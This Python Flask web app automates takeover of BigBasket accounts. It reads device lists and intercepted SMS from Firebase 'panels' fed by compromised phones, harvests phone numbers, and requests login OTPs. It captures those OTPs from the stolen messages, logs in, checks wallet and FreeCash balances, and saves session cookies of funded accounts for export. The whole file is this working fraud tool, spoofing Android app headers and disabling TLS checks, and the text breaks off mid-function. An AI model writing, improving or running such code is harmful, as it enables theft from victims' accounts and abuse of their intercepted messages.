#!/usr/bin/env python3
"""
BigBasket Panel Processor - User Isolated (Different logs for different users)
Each user gets their own private room, session storage, and logs
"""

import os
import sys
import json
import re
import time
import base64
import urllib.parse
import logging
import threading
import uuid
from typing import Optional, List, Dict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps

import requests
from flask import Flask, request, jsonify, send_file, session
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room

# ============================================================
# CONFIGURATION
# ============================================================
OTP_TIMEOUT = 30
MAX_RETRIES = 3
CONCURRENT_WORKERS = 5

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
app.config['SESSION_COOKIE_SECURE'] = False  # Set to True in production with HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = 86400  # 24 hours

# CORS - Allow all origins with credentials
CORS(app, supports_credentials=True, origins="*")

# SocketIO with user rooms
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    async_mode='threading',
    ping_timeout=60,
    ping_interval=25
)

# ============================================================
# USER SESSIONS STORAGE
# ============================================================
BASE_SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
os.makedirs(BASE_SESSIONS_DIR, exist_ok=True)

def get_user_sessions_dir(user_id: str) -> str:
    """Get user-specific sessions directory"""
    user_dir = os.path.join(BASE_SESSIONS_DIR, user_id)
    os.makedirs(user_dir, exist_ok=True)
    return user_dir

def save_user_session(user_id: str, phone: str, device_id: str, panel_url: str, 
                       wallet: float, freecash: float, cookies_data: dict = None):
    """Save successful session to user's directory"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_data = {
        'phone': phone,
        'device_id': device_id,
        'panel': panel_url,
        'wallet': wallet,
        'freecash': freecash,
        'timestamp': timestamp,
        'cookies': cookies_data or {}
    }
    
    user_dir = get_user_sessions_dir(user_id)
    
    # Save individual session file
    filename = f"{phone}_{timestamp}.json"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w') as f:
        json.dump(session_data, f, indent=2)
    
    # Also append to user's master log
    master_file = os.path.join(user_dir, "all_sessions.json")
    try:
        with open(master_file, 'r') as f:
            all_sessions = json.load(f)
    except:
        all_sessions = []
    
    all_sessions.append(session_data)
    with open(master_file, 'w') as f:
        json.dump(all_sessions, f, indent=2)
    
    return filepath

def get_user_sessions(user_id: str) -> List[Dict]:
    """Get all sessions for a user"""
    master_file = os.path.join(get_user_sessions_dir(user_id), "all_sessions.json")
    try:
        with open(master_file, 'r') as f:
            return json.load(f)
    except:
        return []

# ============================================================
# USER STATE - Isolated per user
# ============================================================
user_processing_states = {}
user_states_lock = threading.Lock()

def get_user_state(user_id: str) -> Dict:
    """Get or create user's processing state"""
    with user_states_lock:
        if user_id not in user_processing_states:
            user_processing_states[user_id] = {
                'running': False,
                'results': [],
                'cash_results': [],
                'total_devices': 0,
                'processed_devices': 0,
                'abort': False,
                'current_panel': 0,
                'total_panels': 0,
                'room': user_id,
                'ip': '',
                'user_agent': '',
                'created_at': datetime.now().isoformat(),
            }
        return user_processing_states[user_id]

def cleanup_old_states():
    """Clean up old user states (older than 1 hour)"""
    with user_states_lock:
        current_time = datetime.now()
        to_remove = []
        for user_id, state in user_processing_states.items():
            created = datetime.fromisoformat(state.get('created_at', '2000-01-01T00:00:00'))
            if (current_time - created).total_seconds() > 3600 and not state['running']:
                to_remove.append(user_id)
        for user_id in to_remove:
            del user_processing_states[user_id]

# ============================================================
# BIGBASKET CLIENT
# ============================================================
class BigBasketClient:
    def __init__(self, silent: bool = False):
        self.silent = silent
        self.session = requests.Session()
        self.session.headers.update({
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Google Chrome";v="120", "Not:A-Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'BB Android/v8.35.0/os 15',
            'x-channel': 'BB-Android',
            'x-entry-context': 'bb-b2c',
            'x-tcp-platform': 'native',
            'x-tcp-device-version': 'android_8.35.0_25113510',
            'common-client-static-version': '104',
            'x-device-model': 'Samsung SM-A536E',
            'x-is-debug': 'false',
            'x-pharma': 'true',
            'x-integrated-fc-door-visible': 'true',
            'x-bucket-id': '50',
        })
        self.device_id = None
        self.visitor_id = None
        self.m_id = None
        self.bb_token = None
        self.ref_id = None
        self.csrf_token = None
        self.last_otp_error = ""
        
    def _log(self, msg: str):
        if not self.silent:
            print(msg)
    
    def _request(self, method: str, url: str, **kwargs) -> requests.Response:
        kwargs['verify'] = False
        return self.session.request(method, url, **kwargs)
    
    def _fetch_json(self, method: str, url: str, **kwargs) -> Optional[Dict]:
        try:
            resp = self._request(method, url, **kwargs)
            
            if resp.status_code == 429:
                time.sleep(2)
                resp = self._request(method, url, **kwargs)
            
            if resp.status_code != 200:
                return None
            
            if 'csurftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csurftoken']
            
            return resp.json()
        except Exception as e:
            self._log(f"Request error: {e}")
            return None
    
    def generate_device_id(self) -> str:
        import random
        return ''.join(random.choices('0123456789abcdef', k=16))
    
    def register_device(self) -> bool:
        self.device_id = self.generate_device_id()
        payload = {
            'imei': '02:00:00:00:00:00',
            'device_id': self.device_id,
            'city_id': '1',
            'properties': json.dumps({
                'platform': 'java',
                'os_name': 'android',
                'os_version': '15',
                'app_version': '8.35.0',
                'device_make': 'Samsung',
                'device_model': 'SM-A536E',
                'screen_resolution': '900X1600',
                'screen_dpi': 240
            })
        }
        
        try:
            resp = self._fetch_json(
                'POST',
                'https://www.bigbasket.com/mapi/v4.2.0/register/device/',
                json=payload
            )
            if resp and 'response' in resp and 'visitor_id' in resp['response']:
                self.visitor_id = resp['response']['visitor_id']
                return True
            return False
        except Exception as e:
            self._log(f"Register device error: {e}")
            return False
    
    def load_ui_data(self) -> bool:
        endpoints = [
            'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true&app_launch=true',
            'https://www.bigbasket.com/ui-svc/v1/app-data?os_name=android&app_version=8.35.0',
            'https://www.bigbasket.com/ui-svc/v1/door-data?lob_required=true',
        ]
        for url in endpoints:
            try:
                self._fetch_json('GET', url)
                time.sleep(0.2)
            except:
                pass
        return True
    
    def update_device_info(self) -> bool:
        try:
            self._fetch_json(
                'POST',
                'https://www.bigbasket.com/mapi/v4.2.0/update/device/info/',
                json={'ad_id': '3e0d3f64-3657-40af-9095-c0f4fc692d8e'}
            )
            return True
        except:
            return True
    
    def request_otp(self, mobile: str) -> bool:
        try:
            resp = self._fetch_json(
                'POST',
                'https://www.bigbasket.com/member-tdl/v3/member/otp/',
                json={'identifier': mobile, 'referrer': 'unified_login'}
            )
            if resp and 'refId' in resp:
                self.ref_id = resp['refId']
                return True
            self.last_otp_error = str(resp) if resp else "No response"
            return False
        except Exception as e:
            self.last_otp_error = str(e)
            return False
    
    def verify_otp(self, mobile: str, otp: str) -> bool:
        try:
            resp = self._fetch_json(
                'POST',
                'https://www.bigbasket.com/member-tdl/v3/member/unified-login/',
                json={'mobile_no': mobile, 'mobile_no_otp': otp, 'refId': self.ref_id}
            )
            if resp:
                if 'bb_token' in resp:
                    self.bb_token = resp['bb_token']
                    self.session.cookies.set('BBAUTHTOKEN', self.bb_token)
                if 'visitor_id' in resp:
                    self.visitor_id = resp['visitor_id']
                if 'm_id' in resp:
                    self.m_id = resp['m_id']
                self.csrf_token = self.session.cookies.get('csurftoken')
                return True
            return False
        except Exception as e:
            self._log(f"Verify OTP error: {e}")
            return False
    
    def get_wallet_details(self) -> Optional[Dict]:
        if not self.bb_token:
            return None
        
        try:
            self._fetch_json('GET', 'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true')
            self.csrf_token = self.session.cookies.get('csurftoken')
            
            headers = {
                'x-entry-context-id': '100',
                'x-integrated-fc-door-visible': 'true',
                'x-entry-context': 'bb-b2c',
                'x-tracker': str(time.time()),
                'x-pharma': 'true',
            }
            if self.csrf_token:
                headers['x-csurftoken'] = self.csrf_token
            
            self.session.cookies.set('_bb_source', 'app')
            self.session.cookies.set('_bb_vid', self.visitor_id or '')
            self.session.cookies.set('_bb_mid', self.m_id or '')
            
            resp = self._fetch_json('GET', 'https://www.bigbasket.com/wallet/v1/details', headers=headers)
            return resp
        except Exception as e:
            self._log(f"Get wallet error: {e}")
            return None
    
    def get_free_cash(self) -> Optional[Dict]:
        if not self.bb_token:
            return None
        
        try:
            self._fetch_json('GET', 'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true')
            self.csrf_token = self.session.cookies.get('csurftoken')
            
            headers = {
                'content-type': 'application/json',
                'x-retry': '0',
                'x-tcp-device-version': 'android_8.38.0_25115710',
                'common-client-static-version': '105',
                'x-bucket-id': '36',
                'x-channel': 'BB-Android',
                'x-tracker': str(time.time()),
                'x-entry-context': 'bb-b2c',
                'x-entry-context-id': '100',
            }
            if self.csrf_token:
                headers['x-csurftoken'] = self.csrf_token
            
            payload = {
                'freecash_v2_enabled': True,
                'sa_city_ids': [18],
                'sa_ids': [28425],
                'context': 'homepage',
                'page_type': None,
                'channel': 'BB-Android'
            }
            
            resp = self._fetch_json('POST', 'https://www.bigbasket.com/ui-svc/v1/free-cash/', 
                                    headers=headers, json=payload)
            return resp
        except Exception as e:
            self._log(f"Get FreeCash error: {e}")
            return None

# ============================================================
# FIREBASE HELPERS
# ============================================================
def parse_panel_link(link: str) -> Optional[str]:
    if not link:
        return None
    link = link.strip()
    link = re.sub(r'^\d+\.?\s*', '', link)
    
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        if not link.endswith("/"):
            link += "/"
        return link
    
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.startswith("http"):
            link = "https://" + link
        if not link.endswith("/"):
            link += "/"
        return link
        
    try:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if "s" not in qs:
            return None
        s_param = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
        decoded = base64.b64decode(s_param).decode("utf-8")
        if "|||" in decoded:
            decoded = decoded.split("|||")[0]
        if not decoded.startswith("http"):
            decoded = "https://" + decoded
        if not decoded.endswith("/"):
            decoded += "/"
        return decoded
    except:
        return None

def extract_urls_from_text(text: str) -> List[str]:
    urls = []
    patterns = [
        r'https?://[a-zA-Z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s]*)?',
        r'https?://(?:profex|console|merger|firex)\.site\.je/\?s=[A-Za-z0-9=]+',
        r'[a-zA-Z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s]*)?',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            url = match.strip()
            url = re.sub(r'[.,;:!?)$]+\s*$', '', url)
            if not url.startswith('http'):
                url = 'https://' + url
            if not url.endswith('/'):
                url += '/'
            urls.append(url)
    return urls

def fetch_clients(firebase_url: str) -> List[Dict]:
    try:
        url = firebase_url + 'clients.json'
        resp = requests.get(url, timeout=15, verify=False)
        if resp.status_code != 200:
            return []
        data = resp.json()
        if not data or not isinstance(data, dict):
            return []
        
        clients = []
        for client_id, info in data.items():
            if not isinstance(info, dict):
                continue
            if not info.get('status', False):
                continue
            clients.append({
                'id': client_id,
                'name': info.get('modelName') or info.get('model') or info.get('deviceName') or client_id,
                'phone': info.get('mobNo') or None,
            })
        return clients
    except Exception as e:
        logger.error(f"Fetch clients error: {e}")
        return []

def fetch_phone_from_messages(firebase_url: str, client_id: str) -> Optional[str]:
    try:
        url = f"{firebase_url}messages/{client_id}.json?orderBy=\"$key\"&limitToLast=10"
        resp = requests.get(url, timeout=10, verify=False)
        if resp.status_code != 200:
            return None
        data = resp.json()
        if not data or not isinstance(data, dict):
            return None
        
        patterns = [
            re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
            re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE),
        ]
        
        for msg_id in sorted(data.keys(), reverse=True):
            msg = data[msg_id]
            if not isinstance(msg, dict):
                continue
            text = str(msg.get('body') or msg.get('message') or msg.get('text') or '')
            for pat in patterns:
                match = pat.search(text)
                if match:
                    num = match.group(1) or match.group(0)
                    num = re.sub(r'[^0-9]', '', num)
                    if len(num) == 12 and num.startswith('91'):
                        num = num[2:]
                    if len(num) == 10 and num[0] in '6789':
                        return num
        return None
    except:
        return None

def fetch_otp_from_firebase(firebase_url: str, client_id: str, timeout: int = OTP_TIMEOUT) -> Optional[str]:
    start_time = time.time()
    trigger_time = int((time.time() - 30) * 1000)
    
    patterns = [
        re.compile(r'(?<!\d)(\d{6})(?!\d)'),
        re.compile(r'(?:login code|otp|verification code)[:\s]*(\d{6})', re.IGNORECASE),
        re.compile(r'(\d{6})\s+is your OTP', re.IGNORECASE),
        re.compile(r'Your OTP is (\d{6})', re.IGNORECASE),
        re.compile(r'Bigbasket login code[:\s]*(\d{6})', re.IGNORECASE),
    ]
    
    session = requests.Session()
    session.verify = False
    
    while time.time() - start_time < timeout:
        try:
            url = f"{firebase_url}messages/{client_id}.json"
            resp = session.get(url, timeout=5)
            if resp.status_code != 200:
                time.sleep(0.5)
                continue
            data = resp.json()
            if not data or not isinstance(data, dict):
                time.sleep(0.5)
                continue
            
            for msg_id in sorted(data.keys(), reverse=True):
                msg = data[msg_id]
                if not isinstance(msg, dict):
                    continue
                try:
                    ts = int(msg_id)
                    if ts < trigger_time:
                        continue
                except:
                    pass
                
                text = str(msg.get('body') or msg.get('message') or msg.get('text') or '')
                text_lower = text.lower()
                if not any(kw in text_lower for kw in ['bigbasket', 'login code', 'otp', 'verification']):
                    continue
                
                for pat in patterns:
                    match = pat.search(text)
                    if match:
                        otp = match.group(1) or match.group(0)
                        otp = re.sub(r'\D', '', otp)
                        if len(otp) == 6 and otp.isdigit():
                            return otp
            time.sleep(0.5)
        except:
            time.sleep(0.5)
    return None

# ============================================================
# PROCESSING ENGINE - USER ISOLATED
# ============================================================
def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int, 
                   user_id: str, socketio_instance) -> Dict:
    result = {
        'panel': firebase_url,
        'device_id': client_id,
        'phone': phone,
        'wallet': 0,
        'freecash': 0,
        'status': 'error',
        'message': '',
        'session_saved': False,
    }
    
    prefix = f"[P{panel_idx}] {phone}"
    
    try:
        client = BigBasketClient(silent=True)
        
        # Register device
        reg_ok = False
        for attempt in range(MAX_RETRIES):
            if client.register_device():
                reg_ok = True
                break
            time.sleep(2)
        if not reg_ok:
            result['status'] = 'error'
            result['message'] = 'Registration failed'
            return result
        
        # Load UI
        ui_ok = False
        for attempt in range(MAX_RETRIES):
            if client.load_ui_data():
                ui_ok = True
                break
            time.sleep(2)
        if not ui_ok:
            result['status'] = 'error'
            result['message'] = 'UI load failed'
            return result
        
        # Update device info
        info_ok = False
        for attempt in range(MAX_RETRIES):
            if client.update_device_info():
                info_ok = True
                break
            time.sleep(2)
        if not info_ok:
            result['status'] = 'error'
            result['message'] = 'Device info update failed'
            return result
        
        # Clean phone number
        clean_phone = re.sub(r'[^0-9]', '', phone)
        if len(clean_phone) == 12 and clean_phone.startswith('91'):
            clean_phone = clean_phone[2:]
        if len(clean_phone) != 10:
            result['status'] = 'error'
            result['message'] = 'Invalid phone number'
            return result
        
        # Request OTP
        socketio_instance.emit('log', {'message': f"{prefix} Requesting OTP...", 'type': 'info'}, room=user_id)
        otp_sent = client.request_otp(clean_phone)
        if not otp_sent:
            err = client.last_otp_error or ""
            if any(kw in err.lower() for kw in ["inactive", "does not exist", "invalid"]):
                result['status'] = 'inactive'
                result['message'] = 'Account inactive'
                socketio_instance.emit('log', {'message': f"{prefix} Inactive", 'type': 'warning'}, room=user_id)
                return result
            result['status'] = 'error'
            result['message'] = f'OTP failed: {err}'
            socketio_instance.emit('log', {'message': f"{prefix} OTP failed", 'type': 'error'}, room=user_id)
            return result
        
        # Wait for OTP
        socketio_instance.emit('log', {'message': f"{prefix} Waiting for OTP...", 'type': 'info'}, room=user_id)
        otp = fetch_otp_from_firebase(firebase_url, client_id, OTP_TIMEOUT)
        
        if not otp:
            result['status'] = 'error'
            result['message'] = 'OTP not received'
            socketio_instance.emit('log', {'message': f"{prefix} OTP not received", 'type': 'error'}, room=user_id)
            return result
        
        socketio_instance.emit('log', {'message': f"{prefix} OTP received", 'type': 'success'}, room=user_id)
        
        # Verify OTP
        socketio_instance.emit('log', {'message': f"{prefix} Verifying...", 'type': 'info'}, room=user_id)
        verify_ok = client.verify_otp(clean_phone, otp)
        if not verify_ok:
            result['status'] = 'error'
            result['message'] = 'OTP verification failed'
            socketio_instance.emit('log', {'message': f"{prefix} Verification failed", 'type': 'error'}, room=user_id)
            return result
        
        socketio_instance.emit('log', {'message': f"{prefix} Logged in!", 'type': 'success'}, room=user_id)
        
        # Get wallet
        socketio_instance.emit('log', {'message': f"{prefix} Fetching wallet...", 'type': 'info'}, room=user_id)
        wallet = client.get_wallet_details()
        balance = wallet.get('current_wallet_balance', 0) if wallet else 0
        result['wallet'] = round(balance) if balance > 0 else 0
        
        # Get FreeCash
        socketio_instance.emit('log', {'message': f"{prefix} Fetching FreeCash...", 'type': 'info'}, room=user_id)
        freecash_data = client.get_free_cash()
        freecash = freecash_data.get('total_freecash_amount', 0) if freecash_data else 0
        result['freecash'] = round(freecash) if freecash > 0 else 0
        
        # Save session if cash found - USER SPECIFIC
        if balance > 0 or freecash > 0:
            cookies = {}
            try:
                cookies = dict(client.session.cookies)
            except:
                pass
            
            saved_file = save_user_session(
                user_id=user_id,
                phone=clean_phone,
                device_id=client_id,
                panel_url=firebase_url,
                wallet=balance,
                freecash=freecash,
                cookies_data=cookies
            )
            result['session_saved'] = True
            socketio_instance.emit('log', {'message': f"{prefix} 💾 Session saved", 'type': 'success'}, room=user_id)
        
        if balance > 0 and freecash > 0:
            result['status'] = 'cash'
            result['message'] = f"Wallet: Rs{balance}, FreeCash: Rs{freecash}"
            socketio_instance.emit('log', {'message': f"{prefix} $$$ Wallet: Rs{balance} | FreeCash: Rs{freecash}", 'type': 'cash'}, room=user_id)
        elif balance > 0:
            result['status'] = 'wallet'
            result['message'] = f"Wallet: Rs{balance}"
            socketio_instance.emit('log', {'message': f"{prefix} Wallet: Rs{balance}", 'type': 'success'}, room=user_id)
        elif freecash > 0:
            result['status'] = 'cash'
            result['message'] = f"FreeCash: Rs{freecash}"
            socketio_instance.emit('log', {'message': f"{prefix} $$$ FreeCash: Rs{freecash}", 'type': 'cash'}, room=user_id)
        else:
            result['status'] = 'success'
            result['message'] = 'No cash found'
            socketio_instance.emit('log', {'message': f"{prefix} No cash", 'type': 'info'}, room=user_id)
        
        return result
        
    except Exception as e:
        result['status'] = 'error'
        result['message'] = str(e)[:100]
        socketio_instance.emit('log', {'message': f"{prefix} Error: {str(e)[:100]}", 'type': 'error'}, room=user_id)
        return result

def process_panel_devices(devices: List[Dict], panel_idx: int, user_id: str, socketio_instance) -> List[Dict]:
    results = []
    total = len(devices)
    user_state = get_user_state(user_id)
    
    socketio_instance.emit('log', {'message': f"Processing {total} devices from Panel {panel_idx}...", 'type': 'panel'}, room=user_id)
    
    with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
        futures = {}
        for device in devices:
            if user_state['abort']:
                break
            future = executor.submit(
                process_device,
                device['phone'],
                device['id'],
                device['firebase_url'],
                panel_idx,
                user_id,
                socketio_instance
            )
            futures[future] = device
        
        for future in as_completed(futures):
            if user_state['abort']:
                break
            try:
                result = future.result(timeout=120)
                results.append(result)
                user_state['results'].append(result)
                
                if result.get('wallet', 0) > 0 or result.get('freecash', 0) > 0:
                    user_state['cash_results'].append(result)
                
                user_state['processed_devices'] += 1
                
                # Update stats
                cash_count = len(user_state['cash_results'])
                total_wallet = sum(r.get('wallet', 0) for r in user_state['cash_results'])
                total_freecash = sum(r.get('freecash', 0) for r in user_state['cash_results'])
                error_count = sum(1 for r in user_state['results'] if r['status'] == 'error')
                
                socketio_instance.emit('stats', {
                    'total_devices': user_state['total_devices'],
                    'processed_devices': user_state['processed_devices'],
                    'cash_count': cash_count,
                    'total_wallet': total_wallet,
                    'total_freecash': total_freecash,
                    'error_count': error_count,
                    'results': user_state['cash_results'][-50:]
                }, room=user_id)
                
                pct = (user_state['processed_devices'] / user_state['total_devices']) * 100 if user_state['total_devices'] > 0 else 0
                socketio_instance.emit('progress', {'percent': min(pct, 100)}, room=user_id)
                
            except Exception as e:
                device = futures[future]
                socketio_instance.emit('log', {'message': f"Error processing {device['phone']}: {str(e)}", 'type': 'error'}, room=user_id)
    
    return results

def run_panel_processor(panels: List[str], user_id: str, socketio_instance):
    user_state = get_user_state(user_id)
    
    user_state['running'] = True
    user_state['abort'] = False
    user_state['results'] = []
    user_state['cash_results'] = []
    user_state['total_devices'] = 0
    user_state['processed_devices'] = 0
    user_state['current_panel'] = 0
    user_state['total_panels'] = 0
    
    socketio_instance.emit('start', {'message': f'Processing {len(panels)} panels...'}, room=user_id)
    
    # Extract all URLs
    all_panel_urls = []
    for raw_panel in panels:
        url = parse_panel_link(raw_panel)
        if url:
            all_panel_urls.append(url)
            continue
        extracted_urls = extract_urls_from_text(raw_panel)
        for extracted in extracted_urls:
            parsed = parse_panel_link(extracted)
            if parsed:
                all_panel_urls.append(parsed)
    
    all_panel_urls = list(dict.fromkeys(all_panel_urls))
    
    if not all_panel_urls:
        socketio_instance.emit('log', {'message': 'No valid Firebase URLs found', 'type': 'error'}, room=user_id)
        user_state['running'] = False
        socketio_instance.emit('complete', {'message': 'No valid URLs found!'}, room=user_id)
        return
    
    user_state['total_panels'] = len(all_panel_urls)
    socketio_instance.emit('log', {'message': f"Found {len(all_panel_urls)} Firebase URLs", 'type': 'panel'}, room=user_id)
    
    for pi, firebase_url in enumerate(all_panel_urls):
        if user_state['abort']:
            break
        
        panel_idx = pi + 1
        user_state['current_panel'] = panel_idx
        
        socketio_instance.emit('log', {'message': f"\n{'='*50}", 'type': 'panel'}, room=user_id)
        socketio_instance.emit('log', {'message': f"PANEL {panel_idx}/{len(all_panel_urls)}: {firebase_url}", 'type': 'panel'}, room=user_id)
        socketio_instance.emit('panel_status', {
            'panel': panel_idx,
            'total': len(all_panel_urls),
            'status': 'running',
            'url': firebase_url
        }, room=user_id)
        
        clients = fetch_clients(firebase_url)
        if not clients:
            socketio_instance.emit('log', {'message': f"Panel {panel_idx}: No online devices", 'type': 'warning'}, room=user_id)
            socketio_instance.emit('panel_status', {
                'panel': panel_idx,
                'total': len(all_panel_urls),
                'status': 'done',
                'url': firebase_url,
                'devices': 0
            }, room=user_id)
            continue
        
        socketio_instance.emit('log', {'message': f"Panel {panel_idx}: {len(clients)} online devices", 'type': 'info'}, room=user_id)
        
        devices = []
        for client in clients:
            if user_state['abort']:
                break
            phone = client.get('phone')
            if not phone or phone == '-':
                phone = fetch_phone_from_messages(firebase_url, client['id'])
            if phone:
                clean_phone = re.sub(r'[^0-9]', '', phone)
                if len(clean_phone) == 12 and clean_phone.startswith('91'):
                    clean_phone = clean_phone[2:]
                devices.append({
                    'phone': clean_phone,
                    'raw_phone': phone,
                    'id': client['id'],
                    'firebase_url': firebase_url
                })
                socketio_instance.emit('log', {'message': f"  {clean_phone} | {client['id'][:12]}...", 'type': 'success'}, room=user_id)
        
        if not devices:
            socketio_instance.emit('log', {'message': f"Panel {panel_idx}: No phone numbers found", 'type': 'warning'}, room=user_id)
            socketio_instance.emit('panel_status', {
                'panel': panel_idx,
                'total': len(all_panel_urls),
                'status': 'done',
                'url': firebase_url,
                'devices': 0
            }, room=user_id)
            continue
        
        socketio_instance.emit('log', {'message': f"Panel {panel_idx}: {len(devices)} numbers found", 'type': 'info'}, room=user_id)
        user_state['total_devices'] += len(devices)
        
        panel_results = process_panel_devices(devices, panel_idx, user_id, socketio_instance)
        
        socketio_instance.emit('log', {'message': f"Panel {panel_idx}: Complete ({len(devices)} devices processed)", 'type': 'success'}, room=user_id)
        socketio_instance.emit('panel_status', {
            'panel': panel_idx,
            'total': len(all_panel_urls),
            'status': 'done',
            'url': firebase_url,
            'devices': len(devices)
        }, room=user_id)
        
        cash_count = len(user_state['cash_results'])
        total_wallet = sum(r.get('wallet', 0) for r in user_state['cash_results'])
        total_freecash = sum(r.get('freecash', 0) for r in user_state['cash_results'])
        error_count = sum(1 for r in user_state['results'] if r['status'] == 'error')
        
        socketio_instance.emit('stats', {
            'total_devices': user_state['total_devices'],
            'processed_devices': user_state['processed_devices'],
            'cash_count': cash_count,
            'total_wallet': total_wallet,
            'total_freecash': total_freecash,
            'error_count': error_count,
            'results': user_state['cash_results'][-50:]
        }, room=user_id)
    
    user_state['running'] = False
    cash_count = len(user_state['cash_results'])
    
    socketio_instance.emit('log', {'message': f"\n{'='*50}", 'type': 'panel'}, room=user_id)
    socketio_instance.emit('complete', {'message': f'Done! Found {cash_count} accounts with cash'}, room=user_id)
    socketio_instance.emit('log', {'message': f'Complete! {cash_count} accounts with cash', 'type': 'success'}, room=user_id)
    
    total_wallet = sum(r.get('wallet', 0) for r in user_state['cash_results'])
    total_freecash = sum(r.get('freecash', 0) for r in user_state['cash_results'])
    error_count = sum(1 for r in user_state['results'] if r['status'] == 'error')
    
    socketio_instance.emit('stats', {
        'total_devices': user_state['total_devices'],
        'processed_devices': user_state['processed_devices'],
        'cash_count': cash_count,
        'total_wallet': total_wallet,
        'total_freecash': total_freecash,
        'error_count': error_count,
        'results': user_state['cash_results'][-50:]
    }, room=user_id)
    socketio_instance.emit('progress', {'percent': 100}, room=user_id)

# ============================================================
# FLASK ROUTES
# ============================================================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/user_id', methods=['GET'])
def get_user_id():
    """Get or create a unique user ID"""
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    
    user_id = session['user_id']
    user_state = get_user_state(user_id)
    user_state['ip'] = request.remote_addr
    user_state['user_agent'] = request.headers.get('User-Agent', '')
    
    return jsonify({'user_id': user_id})

@app.route('/api/parse', methods=['POST'])
def parse_panels():
    data = request.json
    text = data.get('text', '')
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    panels = []
    for line in lines:
        url = parse_panel_link(line)
        if url:
            panels.append({'raw': line, 'firebase_url': url})
    return jsonify({'panels': panels, 'count': len(panels)})

@app.route('/api/start', methods=['POST'])
def start_processing():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'No user session'}), 400
    
    user_state = get_user_state(user_id)
    if user_state['running']:
        return jsonify({'error': 'Already running'}), 400
    
    data = request.json
    panels = data.get('panels', [])
    if not panels:
        return jsonify({'error': 'No panels provided'}), 400
    
    thread = threading.Thread(target=run_panel_processor, args=(panels, user_id, socketio))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'started', 'panels': len(panels)})

@app.route('/api/stop', methods=['POST'])
def stop_processing():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'No user session'}), 400
    
    user_state = get_user_state(user_id)
    user_state['abort'] = True
    return jsonify({'status': 'stopping'})

@app.route('/api/export', methods=['POST'])
def export_results():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'No user session'}), 400
    
    user_state = get_user_state(user_id)
    results = user_state['cash_results']
    if not results:
        return jsonify({'error': 'No cash results'}), 400
    
    import csv
    from io import StringIO
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(['Panel', 'Device ID', 'Phone', 'Wallet', 'FreeCash', 'Status'])
    for r in results:
        writer.writerow([
            r.get('panel', ''),
            r.get('device_id', ''),
            r.get('phone', ''),
            r.get('wallet', 0),
            r.get('freecash', 0),
            r.get('status', '')
        ])
    output.seek(0)
    return send_file(output, mimetype='text/csv', as_attachment=True, 
                     download_name=f'bigbasket_cash_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv')

@app.route('/api/sessions', methods=['GET'])
def list_sessions():
    """List all saved sessions for the current user"""
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({'error': 'No user session'}), 400
    
    sessions = get_user_sessions(user_id)
    return jsonify({'sessions': sessions, 'count': len(sessions)})

@app.route('/api/users', methods=['GET'])
def list_users():
    """List all active users (admin only)"""
    # Add admin check here if needed
    with user_states_lock:
        users = {}
        for user_id, state in user_processing_states.items():
            users[user_id] = {
                'running': state.get('running', False),
                'ip': state.get('ip', ''),
                'user_agent': state.get('user_agent', '')[:50],
                'total_devices': state.get('total_devices', 0),
                'processed': state.get('processed_devices', 0),
                'created_at': state.get('created_at', ''),
                'sessions_count': len(get_user_sessions(user_id))
            }
    return jsonify({'users': users, 'count': len(users)})

# ============================================================
# SOCKET.IO EVENTS
# ============================================================
@socketio.on('connect')
def handle_connect():
    """User joins their private room"""
    user_id = session.get('user_id')
    if not user_id:
        user_id = str(uuid.uuid4())
        session['user_id'] = user_id
    
    # Update user info
    user_state = get_user_state(user_id)
    user_state['ip'] = request.remote_addr
    user_state['user_agent'] = request.headers.get('User-Agent', '')
    
    join_room(user_id)
    emit('connected', {'status': 'ok', 'user_id': user_id})

@socketio.on('disconnect')
def handle_disconnect():
    user_id = session.get('user_id')
    if user_id:
